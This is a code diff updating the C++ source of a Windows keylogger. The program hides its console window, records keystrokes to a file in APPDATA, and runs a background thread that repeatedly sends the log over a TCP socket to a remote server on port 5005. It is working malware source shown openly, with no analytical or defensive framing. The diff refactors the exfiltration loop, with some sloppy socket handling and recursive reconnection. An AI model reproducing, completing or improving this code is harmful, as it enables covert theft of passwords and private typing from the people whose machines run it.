@@ -2,18 +2,19 @@
 #include <windows.h>
 #include <fstream>
 #include <thread>
+using namespace std;
 
-const std::string SERVER = "0.0.0.0";
+const string SERVER = "";
 const int PORT = 5005;
 
-std::string logFileName = "keylogs.txt";
-std::string appData = std::string(getenv("APPDATA")) + "\\";
+string logFileName = "keylogs.txt";
+string appData = string(getenv("APPDATA")) + "\\";
 const int DELAY = 500; // milliseconds
 
 // Write Pressed Keys to File
 void LogKey(char* key)
 {
-    std::ofstream keylogs(appData + logFileName, std::ios_base::app);
+    ofstream keylogs(appData + logFileName, ios_base::app);
     keylogs << key;
     keylogs.close();
 }
@@ -439,39 +440,39 @@ bool captureKeys(int key)
 
 int transferLogs()
 {
-    std::string buffer, text;
-    char digitBuffer[1024];
+    string buffer, text;
+    char bufsize[1024];
+    int sender;
 
     WSADATA wsData;
-    SOCKET objSocket;
     sockaddr_in client;
+    SOCKET objSocket = socket(AF_INET, SOCK_STREAM, 0);
+
+    if (WSAStartup(MAKEWORD(2, 2), &wsData) != 0) { return EXIT_FAILURE; }
+
+    objSocket = socket(AF_INET, SOCK_STREAM, 0);
+    if (objSocket == SOCKET_ERROR) { return EXIT_FAILURE; }
+
+    client.sin_family = AF_INET;
+    client.sin_port = htons(PORT);
+    client.sin_addr.s_addr = inet_addr(SERVER.c_str());
+    if (connect(objSocket, (sockaddr*)&client, sizeof(client)) == SOCKET_ERROR) {
+        closesocket(objSocket); WSACleanup(); transferLogs();
+    }
 
     while (true)
     {
-        std::ifstream LogFile(appData + logFileName);
+        ifstream LogFile(appData + logFileName);
         while (getline(LogFile, buffer)) { text += buffer + "\n"; }
 
-        if (WSAStartup(MAKEWORD(2, 2), &wsData) != 0) { return EXIT_FAILURE; }
+        Sleep(500); sender = send(objSocket, to_string(text.length()).data(), sprintf(bufsize, "%d", text.length()), 0);
+        Sleep(500); sender = send(objSocket, text.c_str(), text.length(), 0);
 
-        objSocket = socket(AF_INET, SOCK_STREAM, 0);
-        if (objSocket == SOCKET_ERROR) { return EXIT_FAILURE; }
-
-        client.sin_family = AF_INET;
-        client.sin_port = htons(PORT);
-        client.sin_addr.s_addr = inet_addr(SERVER.c_str());
-        if (connect(objSocket, (sockaddr*)&client, sizeof(client)) == SOCKET_ERROR) continue;
-
-        // Send Log Data
-        Sleep(500); send(objSocket, std::to_string(text.length()).data(), sprintf(digitBuffer, "%d", text.length()), 0);
-        Sleep(500); send(objSocket, text.c_str(), text.length(), 0);
-
-        // Close & Cleanup Socket
-        closesocket(objSocket); WSACleanup();
-
-        // Clear Buffers
-        text.clear(); buffer.clear();
-        memset(digitBuffer, 0, sizeof(digitBuffer));
-
+        if (sender == 0 or sender == SOCKET_ERROR) {
+            closesocket(objSocket); WSACleanup(); transferLogs();
+            
+        } text.clear(); buffer.clear();
+        
         Sleep(DELAY);
     }
 }
@@ -480,18 +481,23 @@ int main()
 {
     FreeConsole(); // Disable Terminal Pop-Up
 
-    std::thread t(transferLogs);
+    thread t(transferLogs);
     t.detach();
 
     while (true)
     {
-        for (int key = 8; key <= 190; key++)
-        {
-            if (GetAsyncKeyState(key) == -32767) {
-                if (captureKeys(key) == false) {
-                    continue;
+        try {
+            for (int key = 8; key <= 190; key++)
+            {
+                if (GetAsyncKeyState(key) == -32767) {
+                    if (captureKeys(key) == false) {
+                        continue;
+                    }
                 }
             }
+        
+        } catch (exception e) {
+            cout << "error" << endl;
         }
     }
 }
